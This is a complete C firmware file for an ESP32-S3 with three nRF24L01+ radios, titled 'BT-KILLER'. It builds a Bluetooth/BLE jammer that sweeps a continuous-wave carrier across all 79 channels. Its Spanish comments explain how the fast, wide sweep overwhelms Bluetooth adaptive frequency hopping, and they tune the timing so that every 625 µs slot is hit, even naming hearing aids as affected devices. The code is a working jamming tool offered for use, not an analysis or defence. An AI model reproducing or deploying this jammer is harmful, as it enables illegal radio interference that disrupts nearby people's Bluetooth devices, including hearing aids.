/*
 * =============================================================================
 *  main.c — BT-KILLER 2.4 GHz — ESP32-S3 N16R8 — ESP-IDF v6
 *  3x nRF24L01+ PA/LNA.  UN SOLO MODO: BARRIDO TOTAL 2402..2480 MHz.
 * =============================================================================
 *
 *   NRF2 -> SPI2 (CS  9) CE  5 | core 1
 *   NRF1 -> SPI2 (CS 10) CE  4 | core 1
 *   NRF3 -> SPI3 (CS 21) CE  1 | core 0
 *
 * -----------------------------------------------------------------------------
 *  QUE HACE
 * -----------------------------------------------------------------------------
 *  Los 3 radios barren los 79 canales BT/BLE (RF_CH 2..80) en CONT_WAVE,
 *  desfasados 26 canales entre si, lo mas rapido que el SPI lo permita.
 *  CE queda FIJO EN ALTO: el PA nunca se apaga, el carrier nunca se corta,
 *  solo salta de frecuencia. Cero huecos de PA.
 *
 * -----------------------------------------------------------------------------
 *  POR QUE ESTE Y NO OTRO
 * -----------------------------------------------------------------------------
 *  Duty por canal = radios / canales = 3/79 = 3.8%.  No se sube sin bajar
 *  canales o meter mas radios.
 *
 *  Revisita = canales x tiempo_hop.  Para que un slot BT de 625 us SIEMPRE
 *  reciba un golpe hace falta hop < 7.9 us.  Con dwell 130us la revisita se
 *  va a 10 ms y el audifono se salva.  => el dwell TIENE que ser corto.
 *
 * -----------------------------------------------------------------------------
 *  AFH: lo que rompe a la mayoria de los jammers
 * -----------------------------------------------------------------------------
 *  BT Classic usa AFH: el master mapea los canales malos y deja de saltar
 *  por ahi.  Si jameas poco ancho, AFH te esquiva y no pasa nada.  AFH solo
 *  saca del mapa canales PERSISTENTEMENTE malos -> un barrido rapido y ancho
 *  hace que TODOS esten malos a la vez y AFH no tenga a donde ir.
 *
 * -----------------------------------------------------------------------------
 *  KNOBS
 * -----------------------------------------------------------------------------
 *  DWELL_US   0 = hop a fondo (revisita minima). 10-20 = compromiso.
 *             150 = carrier limpio pero revisita 12 ms (malo para 625 us).
 *  SPI_HZ     hasta 20 MHz, con escalera de fallback para clones.
 *  YIELD_MS   cada cuanto se cede un tick.  Poner CONFIG_FREERTOS_HZ=1000
 *             para que el hueco sea de 1 ms en vez de 10 ms.
 * =============================================================================
 */

#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <math.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "driver/spi_master.h"
#include "driver/gpio.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_rom_sys.h"
#include "soc/spi_struct.h"
#include "led_strip.h"
#include "nvs_flash.h"

static const char *TAG = "BTKILL";

/* ============================ CONFIG ============================ */
#define CH_LO        2                      /* 2402 MHz */
#define CH_HI        80                     /* 2480 MHz */
#define NUM_CANALES  (CH_HI - CH_LO + 1)    /* 79 canales BT/BLE */

#define NUM_RADIOS   3
#define DWELL_US     180        /* 0 = maxima velocidad. Ver KNOBS arriba. */
#define YIELD_MS     1000      /* cesion de tick, 1 vez por segundo */

/* Escalera de reloj SPI: se prueba de arriba a abajo hasta que el chip
   responda el eco de RF_CH.  Los clones aguantan menos. */
static const int spi_hz_escalera[] = { 20000000, 16000000, 10000000, 8000000 };
#define N_HZ (sizeof(spi_hz_escalera) / sizeof(spi_hz_escalera[0]))

/* ============================ GPIO crudo ============================ */
#define GPIO_OUT_W1TS  (*(volatile uint32_t *)0x60004008u)
#define GPIO_OUT_W1TC  (*(volatile uint32_t *)0x6000400Cu)

/* ============================ tiempo ============================ */
#define CPU_MHZ 240u
#define MS_CYC  (CPU_MHZ * 1000u)

static inline __attribute__((always_inline)) uint32_t cyc(void) {
    uint32_t c; __asm__ __volatile__("rsr.ccount %0" : "=a"(c)); return c;
}

/* ============================ LED ============================ */
#define LED_GPIO        GPIO_NUM_48
#define LED_BRILLO      60
#define LED_CICLO_US    18000000.0
#define LED_BREATH_US   6000000.0
#define LED_BREATH_MIN  0.55
#define LED_REFRESCO_MS 16

static led_strip_handle_t led;
static volatile bool      g_jam_ok = false;

/* ============================ nRF24 ============================ */
#define NRF_CONFIG     0x00
#define NRF_EN_AA      0x01
#define NRF_EN_RXADDR  0x02
#define NRF_SETUP_AW   0x03
#define NRF_SETUP_RETR 0x04
#define NRF_RF_CH      0x05
#define NRF_RF_SETUP   0x06
#define NRF_STATUS     0x07
#define NRF_TX_ADDR    0x10

#define CMD_R_REGISTER 0x00
#define CMD_W_REGISTER 0x20
#define CMD_FLUSH_TX   0xE1

#define RF_CONT_WAVE (1u << 7)
#define RF_PLL_LOCK  (1u << 4)
#define RF_SETUP_MAX 0x0E                       /* PA 0 dBm = maximo del chip */
#define RF_SETUP_CW  (RF_SETUP_MAX | RF_CONT_WAVE | RF_PLL_LOCK)
#define CONFIG_TX    0x0E

/* ============================ radios ============================ */
typedef struct {
    const char *nombre;
    spi_host_device_t host;
    gpio_num_t ce, cs, sck, mosi, miso, irq;
    uint8_t    fase;            /* offset dentro del barrido */
    spi_device_handle_t spi;
    spi_dev_t *hw;
    uint8_t    canal;
    uint32_t   k;               /* contador de hop */
    volatile uint32_t hops;
    bool       bang_ok;
} radio_t;

static radio_t radios[NUM_RADIOS] = {
    { .nombre="NRF2", .host=SPI2_HOST, .fase=0,
      .ce=GPIO_NUM_5, .cs=GPIO_NUM_9,  .sck=GPIO_NUM_12, .mosi=GPIO_NUM_11, .miso=GPIO_NUM_13, .irq=GPIO_NUM_16 },
    { .nombre="NRF1", .host=SPI2_HOST, .fase=0,
      .ce=GPIO_NUM_4, .cs=GPIO_NUM_10, .sck=GPIO_NUM_12, .mosi=GPIO_NUM_11, .miso=GPIO_NUM_13, .irq=GPIO_NUM_15 },
    { .nombre="NRF3", .host=SPI3_HOST, .fase=0,
      .ce=GPIO_NUM_1, .cs=GPIO_NUM_21, .sck=GPIO_NUM_18, .mosi=GPIO_NUM_8,  .miso=GPIO_NUM_7,  .irq=GPIO_NUM_2  },
};

static volatile uint16_t g_dwell = DWELL_US;
static uint8_t           g_bang_align = 0;
static int               g_spi_hz = 0;

static inline void ce_hi(radio_t *r) { GPIO_OUT_W1TS = 1u << (uint32_t)r->ce; }
static inline void ce_lo(radio_t *r) { GPIO_OUT_W1TC = 1u << (uint32_t)r->ce; }
static inline void cs_lo(radio_t *r) { GPIO_OUT_W1TC = 1u << (uint32_t)r->cs; }
static inline void cs_hi(radio_t *r) { GPIO_OUT_W1TS = 1u << (uint32_t)r->cs; }

/* ============================ SPI por registro ============================ */
static inline spi_dev_t *spi_hw(spi_host_device_t h) {
    return (h == SPI2_HOST) ? &GPSPI2 : &GPSPI3;
}

/* El byte va a un lane distinto del data_buf segun la alineacion del chip.
   Se autodetecta: align 0/1/2. */
#define BANG_W(c,v) (g_bang_align == 0 ? (((uint32_t)(c)<<24)|((uint32_t)(v)<<16)) : \
                    g_bang_align == 1 ? (((uint32_t)(c)<<8)|(uint32_t)(v))         : \
                                        (((uint32_t)(c))|((uint32_t)(v)<<8)))

static void bang_arm(radio_t *r) {
    spi_dev_t *hw = r->hw;
    hw->user.usr_mosi = 1;  hw->user.usr_miso = 0;
    hw->user.usr_addr = 0;  hw->user.usr_command = 0;  hw->user.usr_dummy = 0;
    hw->dma_conf.dma_tx_ena = 0;  hw->dma_conf.dma_rx_ena = 0;
    hw->ms_dlen.ms_data_bitlen = 15;    /* 16 bits */
}

static inline IRAM_ATTR void bang_write(radio_t *r, uint8_t cmd, uint8_t val) {
    spi_dev_t *hw = r->hw;
    cs_lo(r);
    hw->data_buf[0] = BANG_W(cmd, val);
    hw->cmd.usr = 1;
    uint32_t g = 100000;
    while (hw->cmd.usr && --g) { }
    cs_hi(r);
}

/* ============================ driver (init) ============================ */
static void nrf_write_reg(radio_t *r, uint8_t reg, uint8_t val) {
    spi_transaction_t t = { .flags = SPI_TRANS_USE_TXDATA, .length = 16 };
    t.tx_data[0] = CMD_W_REGISTER | reg;  t.tx_data[1] = val;
    cs_lo(r); spi_device_polling_transmit(r->spi, &t); cs_hi(r);
}
static uint8_t nrf_read_reg(radio_t *r, uint8_t reg) {
    spi_transaction_t t = { .flags = SPI_TRANS_USE_TXDATA | SPI_TRANS_USE_RXDATA, .length = 16 };
    t.tx_data[0] = CMD_R_REGISTER | reg;  t.tx_data[1] = 0xFF;
    cs_lo(r); spi_device_polling_transmit(r->spi, &t); cs_hi(r);
    return t.rx_data[1];
}
static void nrf_write_multi(radio_t *r, uint8_t reg, const uint8_t *b, int n) {
    uint8_t tx[8]; tx[0] = CMD_W_REGISTER | reg;
    for (int i = 0; i < n; i++) tx[1 + i] = b[i];
    spi_transaction_t t = { .length = (size_t)((n + 1) * 8), .tx_buffer = tx };
    cs_lo(r); spi_device_polling_transmit(r->spi, &t); cs_hi(r);
}
static void nrf_cmd(radio_t *r, uint8_t c) {
    spi_transaction_t t = { .flags = SPI_TRANS_USE_TXDATA, .length = 8 };
    t.tx_data[0] = c;
    cs_lo(r); spi_device_polling_transmit(r->spi, &t); cs_hi(r);
}

static void jam_enter(radio_t *r) {
    static const uint8_t dummy[5] = {0,0,0,0,0};
    ce_lo(r);
    nrf_cmd(r, CMD_FLUSH_TX);
    nrf_write_reg(r, NRF_EN_AA, 0x00);
    nrf_write_reg(r, NRF_EN_RXADDR, 0x00);
    nrf_write_reg(r, NRF_SETUP_AW, 0x03);
    nrf_write_reg(r, NRF_SETUP_RETR, 0x00);
    nrf_write_reg(r, NRF_CONFIG, CONFIG_TX);
    nrf_write_reg(r, NRF_RF_SETUP, RF_SETUP_MAX);
    nrf_write_multi(r, NRF_TX_ADDR, dummy, 5);
    nrf_cmd(r, CMD_FLUSH_TX);
    vTaskDelay(pdMS_TO_TICKS(3));
    nrf_write_reg(r, NRF_RF_SETUP, RF_SETUP_CW);   /* CONT_WAVE + PLL_LOCK */
    nrf_write_reg(r, NRF_RF_CH, CH_LO);
    r->canal = CH_LO;
    ce_hi(r);                                       /* PA FIJO EN ALTO */
    bang_arm(r);
}

/* ============================ LED ============================ */
static void led_set(uint8_t rr, uint8_t gg, uint8_t bb) {
    led_strip_set_pixel(led, 0, rr, gg, bb);
    led_strip_refresh(led);
}
static void arcoiris(int64_t t, uint8_t *r, uint8_t *g, uint8_t *b) {
    double d = (double)t;
    double fc = 2.0 * M_PI * d / LED_CICLO_US;
    double rr = (sin(fc) + 1.0) * 0.5;
    double gg = (sin(fc + 2.0 * M_PI / 3.0) + 1.0) * 0.5;
    double bb = (sin(fc + 4.0 * M_PI / 3.0) + 1.0) * 0.5;
    double fr = 2.0 * M_PI * d / LED_BREATH_US;
    double br = (double)LED_BRILLO * (LED_BREATH_MIN + (1.0 - LED_BREATH_MIN) * ((sin(fr) + 1.0) * 0.5));
    *r = (uint8_t)(rr * br + 0.5);
    *g = (uint8_t)(gg * br + 0.5);
    *b = (uint8_t)(bb * br + 0.5);
}
static void led_update(void) {
    if (!g_jam_ok) { led_set(0, 0, 0); return; }
    uint8_t r, g, b;
    arcoiris(esp_timer_get_time(), &r, &g, &b);
    led_set(r, g, b);
}
static void led_init(void) {
    led_strip_config_t sc = { .strip_gpio_num = LED_GPIO, .max_leds = 1,
        .led_model = LED_MODEL_WS2812, .color_component_format = LED_STRIP_COLOR_COMPONENT_FMT_GRB };
    led_strip_rmt_config_t rc = { .clk_src = RMT_CLK_SRC_DEFAULT, .resolution_hz = 10 * 1000 * 1000 };
    ESP_ERROR_CHECK(led_strip_new_rmt_device(&sc, &rc, &led));
    led_set(60, 0, 0); vTaskDelay(pdMS_TO_TICKS(100));
    led_set(0, 60, 0); vTaskDelay(pdMS_TO_TICKS(100));
    led_set(0, 0, 60); vTaskDelay(pdMS_TO_TICKS(100));
    led_set(0, 0, 0);
}

/* ============================ init de bus/radio ============================ */
static void bus_init(spi_host_device_t h, gpio_num_t sck, gpio_num_t mosi, gpio_num_t miso) {
    spi_bus_config_t b = { .mosi_io_num = mosi, .miso_io_num = miso, .sclk_io_num = sck,
        .quadwp_io_num = -1, .quadhd_io_num = -1, .max_transfer_sz = 64 };
    ESP_ERROR_CHECK(spi_bus_initialize(h, &b, SPI_DMA_DISABLED));
}

/* Prueba la escalera de reloj de arriba a abajo.  Deja r->spi apuntando al
   primer reloj con el que el chip responde el eco de RF_CH. */
static bool radio_add(radio_t *r) {
    for (int i = 0; i < (int)N_HZ; i++) {
        spi_device_interface_config_t dc = { .clock_speed_hz = spi_hz_escalera[i],
            .mode = 0, .spics_io_num = -1, .queue_size = 1 };
        if (spi_bus_add_device(r->host, &dc, &r->spi) != ESP_OK) continue;

        nrf_write_reg(r, NRF_RF_CH, 0x5A);
        if (nrf_read_reg(r, NRF_RF_CH) == 0x5A) {
            if (g_spi_hz == 0 || spi_hz_escalera[i] < g_spi_hz) g_spi_hz = spi_hz_escalera[i];
            return true;
        }
        spi_bus_remove_device(r->spi);
        r->spi = NULL;
    }
    return false;
}

static bool radio_init(radio_t *r) {
    gpio_set_direction(r->ce, GPIO_MODE_OUTPUT);
    gpio_set_direction(r->cs, GPIO_MODE_OUTPUT);
    GPIO_OUT_W1TC = 1u << (uint32_t)r->ce;
    GPIO_OUT_W1TS = 1u << (uint32_t)r->cs;

    gpio_config_t io = { .pin_bit_mask = 1ULL << (uint32_t)r->irq,
        .mode = GPIO_MODE_INPUT, .pull_up_en = GPIO_PULLUP_ENABLE, .intr_type = GPIO_INTR_DISABLE };
    gpio_config(&io);

    r->hw = spi_hw(r->host);

    if (!radio_add(r)) {
        ESP_LOGE(TAG, "%s NO RESPONDE (CS=%d)", r->nombre, (int)r->cs);
        return false;
    }
    ESP_LOGI(TAG, "%s OK [SPI%d CS=%d CE=%d @%dMHz]",
             r->nombre, (int)r->host, (int)r->cs, (int)r->ce, g_spi_hz / 1000000);
    return true;
}

/* ============================ bang autodetect ============================ */
/* Se prioriza el GPSPI del propio host para no cruzarse entre cores.
   El otro GPSPI queda como ultimo recurso. */
static void bang_detectar(radio_t *r) {
    spi_dev_t *prim = spi_hw(r->host);
    spi_dev_t *alt  = (prim == &GPSPI2) ? &GPSPI3 : &GPSPI2;
    spi_dev_t *cand[2] = { prim, alt };

    for (int i = 0; i < 2; i++) {
        for (int a = 0; a < 3; a++) {
            g_bang_align = (uint8_t)a;
            r->hw = cand[i];
            bang_write(r, CMD_W_REGISTER | NRF_RF_CH, 0x2A);
            if (nrf_read_reg(r, NRF_RF_CH) == 0x2A) {
                r->bang_ok = true;
                ESP_LOGI(TAG, "%s BANG OK: GPSPI%d align=%d", r->nombre, i + 2, a);
                return;
            }
        }
    }
    r->bang_ok = false;
    r->hw = prim;
    ESP_LOGW(TAG, "%s BANG NO: uso driver", r->nombre);
}

/* ============================ lazo caliente ============================ */
static inline IRAM_ATTR void hop(radio_t *r) {
    r->k++;
    /* Refresh del CONT_WAVE: los clones Si24R1 se caen solos del modo CW */
    if ((r->k % NUM_CANALES) == 0) {
        if (r->bang_ok) bang_write(r, CMD_W_REGISTER | NRF_RF_SETUP, RF_SETUP_CW);
        else            nrf_write_reg(r, NRF_RF_SETUP, RF_SETUP_CW);
    }
    uint8_t ch = (uint8_t)(CH_LO + (r->fase + r->k) % NUM_CANALES);
    if (ch == r->canal) return;
    r->canal = ch;
    if (r->bang_ok) bang_write(r, CMD_W_REGISTER | NRF_RF_CH, ch);
    else            nrf_write_reg(r, NRF_RF_CH, ch);
    r->hops++;
}

/* core 1: SPI2 -> NRF2 + NRF1 */
static void IRAM_ATTR jam_loop_a(void *arg) {
    uint32_t t_yield = cyc();
    for (;;) {
        if (radios[0].spi) hop(&radios[0]);
        if (radios[1].spi) hop(&radios[1]);

        if (g_dwell) {
            uint32_t c0 = cyc();
            while (cyc() - c0 < (uint32_t)g_dwell * CPU_MHZ) { }
        }

        uint32_t now = cyc();
        if (now - t_yield >= (uint32_t)YIELD_MS * MS_CYC) { t_yield = now; vTaskDelay(1); }
    }
}

/* telemetria, la corre core 0 junto al radio */
static void telemetria(void) {
    static uint32_t p0 = 0, p1 = 0, p2 = 0;
    static int64_t  t_prev = 0;

    int64_t now = esp_timer_get_time();
    if (t_prev == 0) { t_prev = now; return; }
    uint32_t dt = (uint32_t)(now - t_prev);
    t_prev = now;
    if (dt < 1000) return;

    uint32_t h[NUM_RADIOS] = { radios[0].hops, radios[1].hops, radios[2].hops };
    uint32_t d[NUM_RADIOS] = { h[0] - p0, h[1] - p1, h[2] - p2 };
    p0 = h[0]; p1 = h[1]; p2 = h[2];

    uint32_t tot = d[0] + d[1] + d[2];
    if (!tot) return;

    uint32_t hops_s = (uint32_t)((uint64_t)tot * 1000000ULL / dt);
    uint32_t us_hop = hops_s ? (1000000UL / (hops_s / NUM_RADIOS ? hops_s / NUM_RADIOS : 1)) : 0;
    uint32_t revisita = us_hop * NUM_CANALES;

    ESP_LOGI(TAG, "hops/s=%lu | us/hop=%lu | REVISITA=%luus | DUTY=%lu%% | dwell=%u | %s",
             (unsigned long)hops_s, (unsigned long)us_hop, (unsigned long)revisita,
             (unsigned long)(us_hop ? (100UL * us_hop / (revisita ? revisita : 1)) : 0),
             (unsigned)g_dwell,
             revisita && revisita < 625 ? ">> RAPIDO" : ">> LENTO");
}

/* core 0: SPI3 -> NRF3 + LED + telemetria */
static void IRAM_ATTR jam_loop_b(void *arg) {
    int64_t t_led = esp_timer_get_time();
    int64_t t_tel = t_led;
    int64_t t_yield = t_led;

    for (;;) {
        if (radios[2].spi) hop(&radios[2]);

        if (g_dwell) {
            uint32_t c0 = cyc();
            while (cyc() - c0 < (uint32_t)g_dwell * CPU_MHZ) { }
        }

        int64_t now = esp_timer_get_time();
        if (now - t_led >= (int64_t)LED_REFRESCO_MS * 1000) { t_led = now; led_update(); }
        if (now - t_tel >= 2000000)                          { t_tel = now; telemetria(); }
        if (now - t_yield >= (int64_t)YIELD_MS * 1000)       { t_yield = now; vTaskDelay(1); }
    }
}

/* ============================ arranque ============================ */
void app_main(void) {
    led_init();
    bus_init(SPI2_HOST, GPIO_NUM_12, GPIO_NUM_11, GPIO_NUM_13);
    bus_init(SPI3_HOST, GPIO_NUM_18, GPIO_NUM_8,  GPIO_NUM_7);

    int activos = 0;
    bool ok[NUM_RADIOS] = {0};
    for (int i = 0; i < NUM_RADIOS; i++) {
        if (radio_init(&radios[i])) { ok[i] = true; activos++; }
    }
    if (activos == 0) {
        ESP_LOGE(TAG, "NINGUN NRF responde. Revisa cableado, 3.3V y los 100uF.");
        for (;;) { led_set(60, 0, 0); vTaskDelay(pdMS_TO_TICKS(200)); }
    }
    if (activos < NUM_RADIOS) ESP_LOGW(TAG, "Solo %d de %d NRF: sigo con los que si", activos, NUM_RADIOS);

    /* fases repartidas parejo entre los radios que quedaron vivos */
    int idx = 0;
    for (int i = 0; i < NUM_RADIOS; i++) {
        if (!ok[i]) continue;
        radios[i].fase = (uint8_t)((NUM_CANALES / activos) * idx);
        idx++;
    }

    for (int i = 0; i < NUM_RADIOS; i++) {
        if (!ok[i]) continue;
        jam_enter(&radios[i]);
        bang_detectar(&radios[i]);
        nrf_write_reg(&radios[i], NRF_RF_CH, CH_LO);
        radios[i].canal = CH_LO;
        bang_arm(&radios[i]);
    }

    g_jam_ok = (activos == NUM_RADIOS);

    xTaskCreatePinnedToCore(jam_loop_a, "jamA", 4096, NULL, configMAX_PRIORITIES - 1, NULL, 1);
    xTaskCreatePinnedToCore(jam_loop_b, "jamB", 4096, NULL, configMAX_PRIORITIES - 1, NULL, 0);

    ESP_LOGI(TAG, "BT-KILLER | %d NRF @%dMHz | %d canales | dwell=%u | DMA OFF | CE fijo",
             activos, g_spi_hz / 1000000, NUM_CANALES, (unsigned)g_dwell);
    ESP_LOGI(TAG, "DUTY=3/%d. Revisita objetivo <625us. Subir duty = menos canales.", NUM_CANALES);
    vTaskDelay(portMAX_DELAY);
}
